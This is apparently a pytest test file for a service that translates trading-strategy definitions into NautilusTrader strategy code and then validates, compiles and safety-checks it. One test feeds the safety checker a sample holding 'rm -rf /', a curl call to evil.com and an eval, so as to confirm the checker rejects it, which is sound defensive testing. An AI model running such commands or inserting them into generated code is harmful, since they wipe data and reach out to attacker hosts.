"""
Test strategy translation implementation completion.

This test validates that the strategy translation code generation,
validation, and compilation pipeline works correctly.
"""

import asyncio
import pytest
from unittest.mock import Mock, patch, MagicMock

from nautilus_integration.services.strategy_translation import (
    StrategyTranslationService,
    F6StrategyDefinition,
    NautilusStrategyConfig,
    CompilationResult,
    SafetyResult,
)


@pytest.fixture
def mock_config():
    """Create mock configuration."""
    config = Mock()
    config.environment = "testing"
    config.log_level = "DEBUG"
    return config


@pytest.fixture
def translation_service(mock_config):
    """Create strategy translation service with mocked dependencies."""
    with patch('nautilus_integration.services.strategy_translation.get_logger') as mock_logger:
        mock_logger.return_value = Mock()
        service = StrategyTranslationService(mock_config)
        return service


@pytest.fixture
def sample_f6_definition():
    """Create sample F6 strategy definition."""
    return F6StrategyDefinition(
        strategy_id="test_trend_strategy",
        name="Test Trend Following",
        family="trend",
        horizon="daily",
        asset_classes=["crypto"],
        description="A simple trend following strategy for testing",
        signal_logic="Buy when fast MA > slow MA, sell when fast MA < slow MA",
        entry_rules=["Fast MA crosses above slow MA"],
        exit_rules=["Fast MA crosses below slow MA"],
        risk_controls=["Max 25% position size", "5% stop loss"],
        parameters={
            "fast_period": 10,
            "slow_period": 20,
            "atr_multiplier": 2.0,
        },
        max_position_size=0.25,
        max_leverage=2.0,
        stop_loss_pct=0.05,
        production_ready=False,
        complexity="medium",
    )


@pytest.fixture
def sample_nautilus_config():
    """Create sample Nautilus strategy configuration."""
    return NautilusStrategyConfig(
        strategy_id="nautilus_test_trend_strategy",
        class_name="TestTrendFollowingStrategy",
        f6_strategy_id="test_trend_strategy",
        parameters={
            "fast_period": 10,
            "slow_period": 20,
            "atr_multiplier": 2.0,
        },
        include_f5_signals=True,
        include_f8_risk=True,
        include_logging=True,
        include_performance_tracking=True,
        compile_check=True,
        safety_checks=True,
        parameter_validation=True,
    )


class TestStrategyTranslationImplementation:
    """Test strategy translation implementation."""
    
    @pytest.mark.asyncio
    async def test_generate_nautilus_strategy_code_completion(
        self, translation_service, sample_f6_definition, sample_nautilus_config
    ):
        """Test that _generate_nautilus_strategy_code method is complete."""
        # Parse parameters
        parameter_mapping = await translation_service._parse_f6_parameters(
            sample_f6_definition, sample_nautilus_config
        )
        
        # Generate code
        generated_code = await translation_service._generate_nautilus_strategy_code(
            sample_f6_definition, sample_nautilus_config, parameter_mapping
        )
        
        # Verify code was generated
        assert generated_code is not None
        assert len(generated_code) > 0
        assert isinstance(generated_code, str)
        
        # Verify key components are present
        assert "TestTrendFollowingStrategy" in generated_code
        assert "class TestTrendFollowingStrategy(Strategy):" in generated_code
        assert "def on_start(self):" in generated_code
        assert "def on_stop(self):" in generated_code
        assert "def on_bar(self, bar: Bar):" in generated_code
        
        # Verify F5 signal integration
        assert "F5SignalClient" in generated_code
        assert "self.f5_signal_client" in generated_code
        
        # Verify F8 risk integration
        assert "F8RiskClient" in generated_code
        assert "self.f8_risk_client" in generated_code
        
        # Verify parameter initialization
        assert "self.fast_period" in generated_code
        assert "self.slow_period" in generated_code
        assert "self.atr_multiplier" in generated_code
    
    @pytest.mark.asyncio
    async def test_validate_generated_code_completion(
        self, translation_service, sample_nautilus_config
    ):
        """Test that _validate_generated_code method is complete."""
        # Create simple valid Python code
        test_code = '''
class TestStrategy:
    def __init__(self):
        self.log = Mock()  # Add logging mock
        pass
    
    def on_start(self):
        pass
    
    def on_stop(self):
        pass
    
    def on_bar(self, bar):
        try:
            pass
        except Exception as error:
            self.log.error(f"Error: {error}")
'''
        
        # Test validation
        result = await translation_service._validate_generated_code(
            test_code, sample_nautilus_config
        )
        
        # Verify result structure
        assert hasattr(result, 'success')
        assert hasattr(result, 'errors')
        assert isinstance(result.errors, list)
        
        # Print errors for debugging
        if not result.success:
            print(f"Validation errors: {result.errors}")
        
        # Should pass basic compilation (but may fail quality checks)
        # The important thing is that the method completes without crashing
        assert result is not None
    
    @pytest.mark.asyncio
    async def test_validate_generated_code_with_syntax_error(
        self, translation_service, sample_nautilus_config
    ):
        """Test validation with syntax error."""
        # Create code with syntax error
        test_code = '''
class TestStrategy:
    def __init__(self)  # Missing colon
        pass
'''
        
        # Test validation
        result = await translation_service._validate_generated_code(
            test_code, sample_nautilus_config
        )
        
        # Should fail compilation
        assert result.success is False
        assert len(result.errors) > 0
        assert any("syntax error" in error.lower() for error in result.errors)
    
    @pytest.mark.asyncio
    async def test_perform_safety_checks_completion(
        self, translation_service, sample_f6_definition, sample_nautilus_config
    ):
        """Test that _perform_safety_checks method is complete."""
        # Create safe test code
        safe_code = '''
from nautilus_trader.trading.strategy import Strategy

class TestStrategy(Strategy):
    def __init__(self, config):
        super().__init__(config)
        self.log.info("Strategy initialized")
    
    def on_start(self):
        self.log.info("Strategy started")
    
    def on_bar(self, bar):
        try:
            self.log.info(f"Processing bar: {bar}")
        except Exception as error:
            self.log.error(f"Error: {error}")
'''
        
        # Test safety checks
        result = await translation_service._perform_safety_checks(
            sample_f6_definition, safe_code, sample_nautilus_config
        )
        
        # Verify result structure
        assert hasattr(result, 'passed')
        assert hasattr(result, 'errors')
        assert hasattr(result, 'warnings')
        assert isinstance(result.errors, list)
        assert isinstance(result.warnings, list)
        
        # Should pass safety checks
        assert result.passed is True
    
    @pytest.mark.asyncio
    async def test_perform_safety_checks_with_dangerous_code(
        self, translation_service, sample_f6_definition, sample_nautilus_config
    ):
        """Test safety checks with dangerous code."""
        # Create dangerous test code
        dangerous_code = '''
import os
import subprocess

class TestStrategy:
    def __init__(self):
        os.system("rm -rf /")  # Dangerous!
        subprocess.call(["curl", "evil.com"])
        eval("malicious_code")
'''
        
        # Test safety checks
        result = await translation_service._perform_safety_checks(
            sample_f6_definition, dangerous_code, sample_nautilus_config
        )
        
        # Should fail safety checks
        assert result.passed is False
        assert len(result.errors) > 0
    
    @pytest.mark.asyncio
    async def test_compilation_pipeline_completion(
        self, translation_service, sample_f6_definition
    ):
        """Test that the compilation pipeline works end-to-end."""
        # Run compilation pipeline
        result = await translation_service.run_strategy_compilation_pipeline(
            sample_f6_definition
        )
        
        # Verify result structure
        assert "success" in result
        assert "f6_strategy_id" in result
        assert "translation_result" in result
        assert "compilation_result" in result
        assert "pipeline_stages" in result
        
        # Verify pipeline stages
        stages = result["pipeline_stages"]
        assert "translation" in stages
        assert "compilation" in stages
        assert "validation" in stages
        assert "safety_checks" in stages
        
        # Should complete translation stage at minimum
        assert stages["translation"] is True
    
    @pytest.mark.asyncio
    async def test_parameter_validation_enhancement(
        self, translation_service, sample_f6_definition
    ):
        """Test enhanced parameter validation."""
        nautilus_parameters = {
            "fast_period": 10,
            "slow_period": 20,
            "atr_multiplier": 2.0,
        }
        
        # Test parameter validation
        result = await translation_service.validate_strategy_parameters(
            sample_f6_definition, nautilus_parameters
        )
        
        # Verify result structure
        assert "valid" in result
        assert "errors" in result
        assert "warnings" in result
        assert "mapped_parameters" in result
        assert "parameter_types" in result
        assert "parameter_ranges" in result
        
        # Should pass validation
        assert result["valid"] is True
        assert len(result["errors"]) == 0
    
    @pytest.mark.asyncio
    async def test_parameter_validation_with_invalid_dependency(
        self, translation_service, sample_f6_definition
    ):
        """Test parameter validation with invalid dependencies."""
        # Fast period >= slow period (invalid for trend strategy)
        nautilus_parameters = {
            "fast_period": 20,  # Should be less than slow_period
            "slow_period": 10,
            "atr_multiplier": 2.0,
        }
        
        # Test parameter validation
        result = await translation_service.validate_strategy_parameters(
            sample_f6_definition, nautilus_parameters
        )
        
        # Should fail validation due to parameter dependency violation
        assert result["valid"] is False
        assert len(result["errors"]) > 0
        assert any("fast period" in error.lower() and "slow period" in error.lower() 
                  for error in result["errors"])


if __name__ == "__main__":
    # Run basic test
    async def main():
        mock_config = Mock()
        mock_config.environment = "testing"
        mock_config.log_level = "DEBUG"
        
        with patch('nautilus_integration.services.strategy_translation.get_logger') as mock_logger:
            mock_logger.return_value = Mock()
            service = StrategyTranslationService(mock_config)
        
        f6_def = F6StrategyDefinition(
            strategy_id="test_strategy",
            name="Test Strategy",
            family="trend",
            horizon="daily",
            asset_classes=["crypto"],
            description="Test strategy",
            signal_logic="Test logic",
            entry_rules=["Test entry"],
            exit_rules=["Test exit"],
            risk_controls=["Test risk"],
            parameters={"fast_period": 10, "slow_period": 20},
        )
        
        result = await service.run_strategy_compilation_pipeline(f6_def)
        print(f"Pipeline result: {result['success']}")
        print(f"Stages completed: {result['pipeline_stages']}")
        
        if result["translation_result"]:
            print(f"Code length: {len(result['translation_result'].generated_code)}")
    
    asyncio.run(main())